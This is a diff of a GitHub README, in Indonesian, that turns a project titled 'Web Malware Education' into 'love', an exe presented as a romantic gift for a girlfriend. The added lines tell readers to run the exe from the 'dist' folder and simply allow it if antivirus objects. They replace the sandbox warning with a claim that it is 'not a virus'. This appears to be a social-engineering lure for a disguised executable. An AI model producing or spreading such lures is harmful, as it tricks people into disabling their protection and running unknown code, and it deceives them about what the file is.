@@ -1,30 +1,20 @@
-# Web Malware Education
+# love 
 
-## 📌 Tentang Proyek
-**LOVE** adalah proyek untuk para kaum bucin yang ingin mengungkap kan rasa cintanya untuk pacar dengan cara yang berbeda.
+## 📌 Tentang Project
+**LOVE** adalah proyek untuk para kaum bucin yang ingin mengungkap kan rasa cintanya untuk pacar dengan cara yang keren.
 
 ## 🚀 Cara Menggunakan Proyek Ini
 1. **Clone repository**:
    ```bash
    https://github.com/ipzoone/love.git
    ```
-2. **Buka project** .
-3. **Eksperimen dalam lingkungan yang aman** seperti virtual machine atau sandbox.
+2. **Buka project**masuk ke folder "dist" untuk menjalankan file exe nya.
+3. **Jalankan file exe** jika antivirus mempertanyakannya tinggal izinkan.
 
 ## ⚠️ Disclaimer
-Proyek ini hanya untuk tujuan edukasi dan riset keamanan siber. Jangan menggunakan informasi dalam proyek ini untuk aktivitas ilegal. Semua eksperimen harus dilakukan dalam lingkungan yang aman.
-
-## 📢 Kontribusi
-Kami membuka kontribusi dari komunitas! Jika ingin menambahkan materi atau meningkatkan proyek ini, silakan buat pull request atau laporkan masalah di [issues](https://github.com/ipzoone/web-malware-education.git).
-
-## 📚 Referensi
-- [OWASP](https://owasp.org/)
-- [MITRE ATT&CK](https://attack.mitre.org/)
-- [CVE Database](https://cve.mitre.org/)
+Project ini hanya untuk lucu lucuan dan aman, bukan sebuah virus.
 
 ---
 ./IPZONEX
-**Dibuat dengan ❤️ untuk edukasi keamanan siber.**
+**Dibuat dengan ❤️ untuk para kaum bucin.**
 
-
-buatkan saya readme untuk github untuk project baru saya yaitu love.exe untuk pacar bucin
